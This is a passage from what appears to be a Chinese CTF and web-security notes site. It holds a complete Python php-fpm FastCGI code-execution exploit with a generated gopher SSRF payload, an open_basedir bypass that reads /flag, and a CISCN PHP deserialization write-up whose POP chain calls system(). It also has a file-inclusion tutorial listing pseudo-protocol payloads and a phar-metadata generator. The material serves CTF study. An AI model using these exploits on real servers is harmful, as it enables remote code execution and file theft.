&gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(length &amp; 0xFF) \\\n+ bchr(0) \\\n+ bchr(0) \\\n+ content\nreturn buf\ndef __encodeNameValueParams(self, name, value):\nnLen = len(name)\nvLen = len(value)\nrecord = b''\nif nLen &lt; 128:\nrecord += bchr(nLen)\nelse:\nrecord += bchr((nLen &gt;&gt; 24) | 0x80) \\\n+ bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(nLen &amp; 0xFF)\nif vLen &lt; 128:\nrecord += bchr(vLen)\nelse:\nrecord += bchr((vLen &gt;&gt; 24) | 0x80) \\\n+ bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(vLen &amp; 0xFF)\nreturn record + name + value\ndef __decodeFastCGIHeader(self, stream):\nheader = dict()\nheader['version'] = bord(stream[0])\nheader['type'] = bord(stream[1])\nheader['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])\nheader['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])\nheader['paddingLength'] = bord(stream[6])\nheader['reserved'] = bord(stream[7])\nreturn header\ndef __decodeFastCGIRecord(self, buffer):\nheader = buffer.read(int(self.__FCGI_HEADER_SIZE))\nif not header:\nreturn False\nelse:\nrecord = self.__decodeFastCGIHeader(header)\nrecord['content'] = b''\nif 'contentLength' in record.keys():\ncontentLength = int(record['contentLength'])\nrecord['content'] += buffer.read(contentLength)\nif 'paddingLength' in record.keys():\nskiped = buffer.read(int(record['paddingLength']))\nreturn record\ndef request(self, nameValuePairs={}, post=''):\nif not self.__connect():\nprint('connect failure! please check your fasctcgi-server !!')\nreturn\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nself.sock.send(request)\nself.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\nself.requests[requestId]['response'] = b''\nreturn self.__waitForResponse(requestId)\ndef gopher(self, nameValuePairs={}, post=''):\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nreturn request\ndef __waitForResponse(self, requestId):\ndata = b''\nwhile True:\nbuf = self.sock.recv(512)\nif not len(buf):\nbreak\ndata += buf\ndata = BytesIO(data)\nwhile True:\nresponse = self.__decodeFastCGIRecord(data)\nif not response:\nbreak\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\nor response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nself.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\nif requestId == int(response['requestId']):\nself.requests[requestId]['response'] += response['content']\nif response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\nself.requests[requestId]\nreturn self.requests[requestId]['response']\ndef __repr__(self):\nreturn \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\nif __name__ == '__main__':\nparser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\nparser.add_argument('host', help='Target host, such as 127.0.0.1')\nparser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\nparser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php echo \"PWNed\";?&gt;')\nparser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\nparser.add_argument('-e', '--ext', help='ext absolute path', default='')\nparser.add_argument('-if', '--include_file', help='evil.php absolute path', default='')\nparser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1)\nparser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1)\nargs = parser.parse_args()\nclient = FastCGIClient(args.host, args.port, 3, 0)\nparams = dict()\ndocumentRoot = \"/\"\nuri = args.file\nparams = {\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'POST',\n'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n'SCRIPT_NAME': uri,\n'QUERY_STRING': '',\n'REQUEST_URI': uri,\n'DOCUMENT_ROOT': documentRoot,\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '9985',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1',\n'CONTENT_TYPE': 'application/text',\n'CONTENT_LENGTH': \"%d\" % len(args.code),\n'PHP_VALUE': 'auto_prepend_file = php://input',\n'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\nif args.ext and args.include_file:\n#params['PHP_ADMIN_VALUE']='extension = '+args.ext\nparams['PHP_ADMIN_VALUE']=\"extension_dir = /var/www/html\\nextension = ant.so\"\nparams['PHP_VALUE']='auto_prepend_file = '+args.include_file\nif not args.url_format and not args.base64_format :\nresponse = client.request(params, args.code)\nprint(force_text(response))\nelse:\nresponse = client.gopher(params, args.code)\nif args.url_format:\nprint(urllib.quote(response))\nif args.base64_format:\nprint(base64.b64encode(response))\n</code></pre> <p>\u50bb\u74dc\u5f0f\u4f7f\u7528\u65b9\u6cd5\uff1a</p> <pre><code>python2 exp 10.0.16.11 /var/www/html/index.php -p 9000 -c \"&lt;?php phpinfo();?&gt;\" -u\n</code></pre> <p>\u751f\u6210\u7684\u6587\u4ef6\u5199\u5165\uff0c\u5229\u7528gopher\u534f\u8bae\uff1a</p> <pre><code>gopher://10.0.16.11:9000/_%01%01%D8%D3%00%08%00%00%00%01%00%00%00%00%00%00%01%04%D8%D3%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%D8%D3%00%00%00%00%01%05%D8%D3%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%D8%D3%00%00%00%00\n</code></pre> <p>\u518d\u8bfb\u6587\u4ef6\uff1a</p> <p></p> <p>\uff08\u719f\u6089\u4e00\u70b9\u8fd9\u5c31\u662fphpinfo()\uff09\uff0c\u4e0b\u6b21\u518d\u7f51\u9875\u4e2d\u6253\u5f00\uff0c\u770b\u4e00\u4e0b\u654f\u611f\u4fe1\u606f\u3002</p> <p>open_basedir\u7ed5\u8fc7</p> <p>\u5c06\u6307\u4ee4\u6539\u4e3a\uff1a</p> <pre><code>&lt;?php mkdir('/tmp/fuck');chdir('/tmp/fuck');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));readfile('/flag');?&gt;\n</code></pre> <p>\u540c\u6837\u7684\u65b9\u6cd5\uff0c\u6700\u540ephar://\u8bfb\u5230flag</p>"},{"location":"web/ctf/ciscn_easy_ser/","title":"ciscn_easy_ser","text":"<p>index.php:</p> <pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nclass Test{\n    public $public_key;\n    public $private_key;\n    function __wakeup(){\n        if($public_key !== $private_key)\n        {\n            die(\"You can't\");\n        }\n    }\n    function getHint()\n    {\n        echo file_get_contents('./demo.php');\n    }\n\n}\n\n$a = $_GET['a'];\nif(strpos($a,'key') !== false){\n    die(\"No!!!\");\n}\nelse\n{\n    unserialize($a)();\n}\n?&gt;\n</code></pre> <p>\uff08\u9996\u5148\u90e8\u7f72\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\uff09</p> <p>\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\uff0c\u6bd4\u8f83\u5947\u602a\u7684\u662funserialize($a)()\u540e\u9762\u7684\u8fd9\u4e2a\u62ec\u53f7</p> <p>\u6bd4\u8d5b\u4e2d\u6211\u60f3\u7684\u662f\u5c06\u7c7b\u4f5c\u4e3a\u51fd\u6570\u8c03\u7528\uff0c\u4f1a\u89e6\u53d1<code>__inoke()</code>, \u800c<code>__wakeup()</code>\u7528cve\u53bb\u8fc7\uff0c\u7136\u540e\u627e\u4e2a\u539f\u751f\u7c7b\u505a\u8df3\u677f\u5565\u7684(\u5f53\u7136\u662f\u6ca1\u627e\u5230)\u3002</p> <p>\u6211\u4eec\u5148\u505a\u4e00\u70b9\u5c0f\u5b9e\u9a8c\uff1a</p> <pre><code>&lt;?php\nclass Test\n{\n    public $a;\n    public $b;\n    function __wakeup()\n    {\n        // TODO: Implement __wakeup() method.\n        echo \"__wakeup()\\n\";\n    }\n    function __invoke()\n    {\n        // TODO: Implement __invoke() method.\n        echo \"__invoke()\\n\";\n    }\n    function func()\n    {\n        echo \"func()\\n\";\n    }\n}\n$a = \"Test::func\";\n$f = serialize($a);\nunserialize($f)();//\u9759\u6001\u8c03\u7528\n\n$b = new Test();\n$c = [$b,'func'];echo $c();\n$d = serialize($c);\nunserialize($d)();\n\n\n\u8f93\u51fa\uff1a\nfunc()//\u6765\u81ea\u9759\u6001\u65b9\u6cd5\u8c03\u7528\nfunc()//\u6765\u81eaecho$c()\n__wakeup()//\u6765\u81eaunserialize()\nfunc()//\u6765\u81eaunserialize()\nps:\u9759\u6001\u65b9\u6cd5\u8c03\u7528\u867d\u7136\u4f1a\u62a5\u9519\u4f46\u662f\u4ecd\u7136\u4f1a\u6709\u8f93\u51fa\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\uff1a</p> <ul> <li>\u9759\u6001\u8c03\u7528\u5e76\u6ca1\u6709\u89e6\u53d1__wakeup</li> <li>[$b,'func'] ()\u7684\u5f62\u5f0f\u80fd\u591f\u76f4\u63a5\u8c03\u7528b\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5func</li> <li>[$b,'func'] ()\u7ecf\u8fc7\u53cd\u5e8f\u5217\u5316\u540e\u80fd\u591f\u89e6\u53d1__wakeup</li> </ul> <p>\u56e0\u6b64payload:</p> <pre><code>1.\n$a = \"Test::getHint\";\necho serialize($a);\n\n2.\n$test = new Test();\n$test-&gt;public_key = 1;\n$test-&gt;private_key = 2;\n$a = [$test, 'getHint'];\necho serialize($a);\n\u7136\u540ewakeup\u7528string\uff0ckey\u752816\u8fdb\u5236\u8fc7k::\\6b\n</code></pre> <p>\u7136\u540e\u8fdb\u5165\u8fd4\u56dedemo.php</p> <p>control+u\u67e5\u770b\u6e90\u7801</p> <pre><code>&lt;?php\nclass Fake{\n    public $firm;\n    public $test;\n    public function __set($firm,$test){//\u8bbe\u7f6e\u4e00\u4e2a\u7c7b\u6210\u5458\u53d8\u91cf\u65f6\u8c03\u7528\n    $test = \"No,You can't\";\n    $firm = unserialize($firm);\n    call_user_func($firm,$test);\n  }\n}\nclass Temp{\n    public $pri;\n    public $fin=1;\n    public function __destruct()\n    {\n        $a=$this-&gt;action;\n       $this-&gt;pri-&gt;$a = $this-&gt;fin;\n    }\n\n}\n\nclass OwO{\n    public $fc;\n    public $args;   \n    function run()\n    {\n\n        return ($this-&gt;fc)($this-&gt;args);\n\n    }\n}\n$d = $_GET['poc'];\nunserialize($d);\n?\n</code></pre> <p>\u8fd9\u4e2a\u5c31\u6bd4\u8f83\u6b63\u5e38\u7684pop\u94fe\u4e86\u5165\u53e3__destruction()</p> <pre><code>$a = new Temp();\n$b = new OwO();\n$c = new Fake();\n$b-&gt;fc = \"system\";\n$b-&gt;args = \"ls\";\n$arr = [$b,'run'];\n$d = serialize($arr);\n$a-&gt;pri = $c;\n$a-&gt;action = $d;\necho serialize($a);\n\n//\u5177\u4f53\u4e00\u70b9\u5c31\u662f\uff1aTemp::__destruct-&gt;Fake::__set-&gt;call_user_func-&gt;OwO::run-&gt;system('ls')\n</code></pre> <p></p> <p>\u6700\u540e\u53ef\u4ee5\u770b\u5230\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"web/include/include_normal/","title":"\u6587\u4ef6\u5305\u542b","text":""},{"location":"web/include/include_normal/#_2","title":"\u4ec0\u4e48\u662f\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e","text":"<p>\u901a\u8fc7PHP\u51fd\u6570\u5f15\u5165\u6587\u4ef6\u65f6\uff0c\u4f20\u5165\u7684\u6587\u4ef6\u540d\u6ca1\u6709\u7ecf\u8fc7\u5408\u7406\u7684\u9a8c\u8bc1\uff0c\u4ece\u800c\u64cd\u4f5c\u4e86\u9884\u60f3\u4e4b\u5916\u7684\u6587\u4ef6\uff0c\u5c31\u53ef\u80fd\u5bfc\u81f4\u610f\u5916\u7684\u6587\u4ef6\u6cc4\u6f0f\u751a\u81f3\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u3002</p>"},{"location":"web/include/include_normal/#_3","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u7684\u73af\u5883\u8981\u6c42","text":"<p>allow_url_fopen=On(\u9ed8\u8ba4\u4e3aOn) \u89c4\u5b9a\u662f\u5426\u5141\u8bb8\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u6216\u8005\u7f51\u7ad9\u68c0\u7d22\u6570\u636e</p> <ul> <li> <p>allow_url_include=On(php5.2\u4e4b\u540e\u9ed8\u8ba4\u4e3aOff) \u89c4\u5b9a\u662f\u5426\u5141\u8bb8include/require\u8fdc\u7a0b\u6587\u4ef6</p> </li> <li></li> </ul>"},{"location":"web/include/include_normal/#_4","title":"\u5e38\u89c1\u6587\u4ef6\u5305\u542b\u51fd\u6570","text":"<p>php\u4e2d\u5e38\u89c1\u7684\u6587\u4ef6\u5305\u542b\u51fd\u6570\u6709\u4ee5\u4e0b\u56db\u79cd\uff1a</p> <pre><code>include()\nrequire()\ninclude_once()\nrequire_once()\ninclude\u4e0erequire\u57fa\u672c\u662f\u76f8\u540c\u7684\uff0c\u9664\u4e86\u9519\u8bef\u5904\u7406\u65b9\u9762:\ninclude()\uff0c\u53ea\u751f\u6210\u8b66\u544a\uff08E_WARNING\uff09\uff0c\u5e76\u4e14\u811a\u672c\u4f1a\u7ee7\u7eed\nrequire()\uff0c\u4f1a\u751f\u6210\u81f4\u547d\u9519\u8bef\uff08E_COMPILE_ERROR\uff09\u5e76\u505c\u6b62\u811a\u672c\ninclude_once()\u4e0erequire_once()\uff0c\u5982\u679c\u6587\u4ef6\u5df2\u5305\u542b\uff0c\u5219\u4e0d\u4f1a\u5305\u542b\uff0c\u5176\u4ed6\u7279\u6027\u5982\u4e0a\nPlain Text\n</code></pre> <p>\u603b\u7684\u6765\u8bf4\u5c31\u662f\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4\u670d\u52a1\u5668\u4e2d\u8bfb\u53d6\u6587\u4ef6\u7684\u51fd\u6570\u53ef\u4ee5\u88ab\u5229\u7528</p>"},{"location":"web/include/include_normal/#_5","title":"\u4f2a\u534f\u8bae","text":"<pre><code>ftp://shell.php\nfile:///tmp/shell.php\nhttp://xxxx/shell.php\n\\\\smbserver\\shell.php        //unc\u8def\u5f84\nphar://xxxx/x.zip/shell.php   //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nzip://xxxx/x.zip#shell.php    //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nphp://filter/read=convert.base64-encode/resource=shell.php\ncompress.bzip2://shell.php\ncompress.zlib://shell.jpg\nphp://input    [POST DATA] &lt;?php phpinfo()?&gt;\ndata://text/plain,&lt;?php phpinfo()?&gt;                 //\u4e5f\u53ef\u4ee5data:text/plain,&lt;?php phpinfo()?&gt;\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\nphp://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\nphp://filter/%72ead=convert.base64-encode/resource=shell.%70hp\nPlain Text\n</code></pre> <p>\u4e00\u5171\u6709\u8fd9\u4e48\u591a\u79cd\u5e38\u7528\u7684\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u975e\u5e38\u975e\u5e38\u795e\u5947\u7684\u64cd\u4f5c</p> <p>\u6162\u6162\u6765\u89e3\u91ca\uff1a</p>"},{"location":"web/include/include_normal/#data","title":"data://\u4f2a\u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:on</p> </li> <li> <p><code>allow_url_include</code>:on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u81ea<code>PHP&gt;=5.2.0</code>\u8d77\uff0c\u53ef\u4ee5\u4f7f\u7528<code>data://</code>\u6570\u636e\u6d41\u5c01\u88c5\u5668\uff0c\u4ee5\u4f20\u9012\u76f8\u5e94\u683c\u5f0f\u7684\u6570\u636e\u3002\u901a\u5e38\u53ef\u4ee5\u7528\u6765\u6267\u884cPHP\u4ee3\u7801\u3002</p> </li> <li> <p>\u7528\u6cd5\uff1adata://text/plain,data://text/plain;base64,</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> </ul> <pre><code>data://text/plain,\nhttp://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;\nPlain Text\n</code></pre> <p></p> <pre><code>data://text/plain;base64,\nhttp://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\nPlain Text\n</code></pre> <p></p>"},{"location":"web/include/include_normal/#file","title":"file://\u4f2a\u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:off/on</p> </li> <li> <p><code>allow_url_include</code>:off/on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u7528\u4e8e\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728CTF\u4e2d\u901a\u5e38\u7528\u6765\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7684\u4e14\u4e0d\u53d7<code>allow_url_fopen</code>\u4e0e<code>allow_url_include</code>\u7684\u5f71\u54cd\u3002<code>include()/require()/include_once()/require_once()</code>\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u5bfc\u5165\u4e3a\u975e<code>.php</code>\u6587\u4ef6\uff0c\u5219\u4ecd\u6309\u7167php\u8bed\u6cd5\u8fdb\u884c\u89e3\u6790\uff0c\u8fd9\u662f<code>include()</code>\u51fd\u6570\u6240\u51b3\u5b9a\u7684\u3002</p> </li> <li> <p>\u8bf4\u660e\uff1a<code>file://</code>\u6587\u4ef6\u7cfb\u7edf\u662f PHP \u4f7f\u7528\u7684\u9ed8\u8ba4\u5c01\u88c5\u534f\u8bae\uff0c\u5c55\u73b0\u4e86\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u3002\u5f53\u6307\u5b9a\u4e86\u4e00\u4e2a\u76f8\u5bf9\u8def\u5f84\uff08\u4e0d\u4ee5/\u3001\u3001\\\u6216 Windows \u76d8\u7b26\u5f00\u5934\u7684\u8def\u5f84\uff09\u63d0\u4f9b\u7684\u8def\u5f84\u5c06\u57fa\u4e8e\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u3002\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u662f\u811a\u672c\u6240\u5728\u7684\u76ee\u5f55\uff0c\u9664\u975e\u88ab\u4fee\u6539\u4e86\u3002\u4f7f\u7528 CLI \u7684\u65f6\u5019\uff0c\u76ee\u5f55\u9ed8\u8ba4\u662f\u811a\u672c\u88ab\u8c03\u7528\u65f6\u6240\u5728\u7684\u76ee\u5f55\u3002\u5728\u67d0\u4e9b\u51fd\u6570\u91cc\uff0c\u4f8b\u5982<code>fopen()</code>\u548c<code>file_get_contents()</code>\uff0c<code>include_path</code>\u4f1a\u53ef\u9009\u5730\u641c\u7d22\uff0c\u4e5f\u4f5c\u4e3a\u76f8\u5bf9\u7684\u8def\u5f84\u3002</p> </li> <li> <p>\u7528\u6cd5\uff1a/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\\path\\to\\winfile.ext\\smbserver\\share\\path\\to\\winfile.extfile:///path/to/file.ext</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> <li></li> </ul> <pre><code>file://[\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\nPlain Text\n</code></pre> <p></p> <pre><code>[\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=./phpinfo.txt\nPlain Text\n</code></pre> <p></p> <pre><code>[http\uff1a//\u7f51\u7edc\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\nPlain Text\n</code></pre> <p></p>"},{"location":"web/include/include_normal/#local_file","title":"local_file\u4f2a\u534f\u8bae","text":"<p>\u4e5f\u6709\u65f6\u5019\u5229\u7528local_file\u6765\u7ed5\u8fc7\uff0c\u67e5\u4e86\u4e00\u4e0b\u597d\u50cf\u8fd8\u662f\u4e2acve.</p> <p>\u987a\u5e26\u4e00\u63d0\uff0cflask\u6e90\u7801\u653e\u5728/app/app.py\u4e4b\u4e2d</p> <p>local_file:///sys/class/net/eth0/address:\u8bfb\u53d6MAC\u5730\u5740</p>"},{"location":"web/include/include_normal/#gopher","title":"gopher://\u4f2a\u534f\u8bae","text":"<p>Gopher\u662f\u4e00\u79cd\u5206\u5e03\u5f0f\u6587\u6863\u4f20\u9012\u670d\u52a1\u3002\u5229\u7528\u8be5\u670d\u52a1\uff0c\u7528\u6237\u53ef\u4ee5\u65e0\u7f1d\u5730\u6d4f\u89c8\u3001\u641c\u7d22\u548c\u68c0\u7d22\u9a7b\u7559\u5728\u4e0d\u540c\u4f4d\u7f6e\u7684\u4fe1\u606f\u3002</p> <pre><code>gopher://127.0.0.1:1337/_Hi%0Assrf%0Atest\n</code></pre> <p>\u8fd9\u4e2a\u5728ssrf\u4e2d\u4f1a\u91cd\u70b9\u4ecb\u7ecd</p>"},{"location":"web/include/include_normal/#http-https","title":"http:// &amp; https:// \u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:on</p> </li> <li> <p><code>allow_url_include</code>:on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u5e38\u89c4 URL \u5f62\u5f0f\uff0c\u5141\u8bb8\u901a\u8fc7<code>HTTP 1.0</code>\u7684 GET\u65b9\u6cd5\uff0c\u4ee5\u53ea\u8bfb\u8bbf\u95ee\u6587\u4ef6\u6216\u8d44\u6e90\u3002CTF\u4e2d\u901a\u5e38\u7528\u4e8e\u8fdc\u7a0b\u5305\u542b\u3002</p> </li> <li></li> </ul> <pre><code>\u7528\u6cd5\uff1ahttp://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com\nPlain Text\n</code></pre> <p>\u793a\u4f8b\uff1a</p> <pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\nPlain Text\n</code></pre> <p></p>"},{"location":"web/include/include_normal/#phar","title":"phar://\u4f2a\u534f\u8bae","text":"<pre><code>phar://\u534f\u8bae\u4e0ezip://\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u8bbf\u95eezip\u683c\u5f0f\u538b\u7f29\u5305\u5185\u5bb9\uff0c\u5728\u8fd9\u91cc\u53ea\u7ed9\u51fa\u4e00\u4e2a\u793a\u4f8b\uff1a\nPlain Text\n</code></pre> <pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\nPlain Text\n</code></pre>"},{"location":"web/include/include_normal/#_6","title":"\u6587\u4ef6\u5305\u542b","text":"<p>\u4e0b\u9762\u662f\u6211\u81ea\u5df1\u7684\u603b\u7ed3\uff1a</p> <p>\u8fd9\u91cc\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0bphar\uff0c\u7c7b\u4f3cjava\u4e2d\u7684jar\uff0cphar\u662f\u4e00\u4e2a\u5408\u6210\u8bcd\uff0c\u7531PHP \u548c Archive\u6784\u6210\uff0c\u53ef\u4ee5\u770b\u51fa\u5b83\u662fphp\u5f52\u6863\u6587\u4ef6\u7684\u610f\u601d\u3002phar\u5f52\u6863\u6587\u4ef6\u6709\u4e09\u79cd\u683c\u5f0f\uff1atar\u5f52\u6863\u3001zip\u5f52\u6863\u3001phar\u5f52\u6863\uff0c\u524d\u4e24\u79cd\u6267\u884c\u9700\u8981php\u5b89\u88c5Phar \u6269\u5c55\u652f\u6301\uff0c\u7528\u7684\u4e5f\u6bd4\u8f83\u5c11\uff0c\u8fd9\u91cc\u4e3b\u8981\u8bb2phar\u5f52\u6863\u683c\u5f0f\u3002</p> <p>phar\u683c\u5f0f\u5f52\u6863\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\uff0c\u5b83\u7684\u4ea7\u751f\u4f9d\u8d56\u4e8ePhar\u6269\u5c55\uff0c\u7531\u81ea\u5df1\u7f16\u5199\u7684php\u811a\u672c\u4ea7\u751f\u3002\u4e5f\u662f\u4e00\u79cd\u6d41\u5305\u88c5\u5668\u3002</p> <pre><code>&lt;?php\n    class User {\n        public $db;\n    } \n    class File{\n        public $filename;\n        public function __construct($name){\n            $this-&gt;filename=$name;\n        }\n    }\n    class FileList {\n        private $files;\n        public function __construct(){\n            $this-&gt;files=array(new File('/flag.txt'));\n        }\n    } //\u4e0a\u9762\u662f\u53cd\u5e8f\u5217\u5316\uff0c\u5b9e\u9645\u7528\u4e0b\u6765\u6a21\u677f\u4e00\u70b9\u70b9\u7684\u4e1c\u897f\u5728\u4e0b\u9762\n    $o = new User();\n    $o-&gt;db =new FileList();\n    @unlink(\"phar.phar\");//\u5220\u9664\u4e4b\u524d\u7684test.par\u6587\u4ef6(\u5982\u679c\u6709)\n    $phar = new Phar(\"phar.phar\");//\u521b\u5efa\u4e00\u4e2aphar\u5bf9\u8c61\uff0c\u6587\u4ef6\u540d\u5fc5\u987b\u4ee5phar\u4e3a\u540e\u7f00\n    $phar-&gt;startBuffering();//\u5f00\u59cb\u5199\u6587\u4ef6\n    $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");//\u5199\u5165stub\n    $phar-&gt;setMetadata($o);//\u5199\u5165meta-data\n    $phar-&gt;addFromString(\"test.txt\", \"test\"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n    $phar-&gt;stopBuffering();\n?&gt;\nPlain Text\n</code></pre> <p>\u719f\u6089\u7684\u8bdd\u5e94\u8be5\u80fd\u770b\u51fa\u8fd9\u4e2a\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4f46\u5b83\u8ddfphar\u4f2a\u534f\u8bae\u6709\u6709\u4ec0\u4e48\u8054\u7cfb\u5462\uff1f</p> 